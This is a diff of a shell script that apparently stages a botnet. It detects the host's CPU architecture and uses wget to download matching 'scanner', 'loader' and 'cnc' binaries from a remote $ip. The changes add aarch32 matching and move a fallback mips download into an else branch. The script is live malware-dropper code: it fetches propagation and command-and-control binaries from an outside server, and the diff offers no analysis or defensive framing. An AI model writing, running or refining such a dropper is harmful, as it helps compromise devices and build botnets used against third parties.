@@ -9,7 +9,7 @@ elif echo "$arch" | grep -qiE 'i386|386'; then
     wget "http://$ip/386_scanner" -O scanner
 elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
     wget "http://$ip/arm64_scanner" -O scanner
-elif echo "$arch" | grep -qiE 'arm'; then
+elif echo "$arch" | grep -qiE 'arm|aarch32'; then
     wget "http://$ip/arm_scanner" -O scanner
 elif echo "$arch" | grep -qiE 'mips64le'; then 
     wget "http://$ip/mips64le_scanner" -O scanner
@@ -27,10 +27,10 @@ elif echo "$arch" | grep -qiE 'ppc64'; then
     wget "http://$ip/ppc64_scanner" -O scanner
 elif echo "$arch" | grep -qiE 'riscv64'; then
     wget "http://$ip/riscv64_scanner" -O scanner
-#else
-#    exit
+else
+    wget "http://$ip/mips_scanner" -O scanner #test brute download
 fi
-wget "http://$ip/mips_scanner" -O scanner #test brute download
+
 while [ ! -f scanner ]; do
     sleep 1
 done
@@ -40,7 +40,7 @@ elif echo "$arch" | grep -qiE 'i386|386'; then
     wget "http://$ip/386_loader" -O loader
 elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
     wget "http://$ip/arm64_loader" -O loader
-elif echo "$arch" | grep -qiE 'arm'; then
+elif echo "$arch" | grep -qiE 'arm|aarch32'; then
     wget "http://$ip/arm_loader" -O loader
 elif echo "$arch" | grep -qiE 'mips64le'; then 
     wget "http://$ip/mips64le_loader" -O loader
@@ -58,10 +58,10 @@ elif echo "$arch" | grep -qiE 'ppc64'; then
     wget "http://$ip/ppc64_loader" -O loader
 elif echo "$arch" | grep -qiE 'riscv64'; then
     wget "http://$ip/riscv64_loader" -O loader
-#else
-#    exit
+else
+    wget "http://$ip/mips_loader" -O loader #test brute download
 fi
-wget "http://$ip/mips_loader" -O loader #test brute download
+
 while [ ! -f loader ]; do
     sleep 1
 done
@@ -72,7 +72,7 @@ elif echo "$arch" | grep -qiE 'i386|386'; then
     wget "http://$ip/386_cnc" -O cnc
 elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
     wget "http://$ip/arm64_cnc" -O cnc
-elif echo "$arch" | grep -qiE 'arm'; then
+elif echo "$arch" | grep -qiE 'arm|aarch32'; then
     wget "http://$ip/arm_cnc" -O cnc
 elif echo "$arch" | grep -qiE 'mips64le'; then 
     wget "http://$ip/mips64le_cnc" -O cnc
@@ -90,10 +90,10 @@ elif echo "$arch" | grep -qiE 'ppc64'; then
     wget "http://$ip/ppc64_cnc" -O cnc
 elif echo "$arch" | grep -qiE 'riscv64'; then
     wget "http://$ip/riscv64_cnc" -O cnc
-#else
-#    exit
+else
+    wget "http://$ip/mips_cnc" -O cnc #test brute download
 fi
-wget "http://$ip/mips_cnc" -O cnc #test brute download
+
 while [ ! -f cnc ]; do
     sleep 1
 done
